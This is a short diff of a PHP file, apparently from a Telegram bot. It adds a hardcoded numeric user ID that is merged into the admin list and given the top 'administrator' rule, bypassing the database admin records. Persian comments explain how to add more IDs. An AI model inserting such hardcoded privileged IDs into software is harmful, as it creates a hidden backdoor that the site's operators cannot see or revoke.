@@ -267,7 +267,22 @@ $admin_ids = select("admin", "id_admin", null, null, "FETCH_COLUMN", ['cache' =>
 if (!is_array($admin_ids)) {
     $admin_ids = [];
 }
+
+// لیست آیدی‌های عددی ادمین‌ها (آیدی دوم را در کنار این عدد با گذاشتن, و یک فاصله وارد کنید)
+$my_admin_ids = ['133495331', ];
+
+// اضافه کردن آیدی‌ها به لیست ادمین‌ها در صورت عدم وجود
+foreach ($my_admin_ids as $owner_id) {
+    if (!in_array($owner_id, $admin_ids)) {
+        $admin_ids[] = $owner_id;
+    }
+}
 $admin_ids_str = array_map('strval', $admin_ids);
+
+// فعال‌سازی دسترسی بالاترین سطح مدیریت برای این آیدی‌ها
+if (isset($from_id) && in_array((string)$from_id, $my_admin_ids, true)) {
+    $adminrulecheck = ['rule' => 'administrator'];
+}
 
 if (
     isset($from_id)
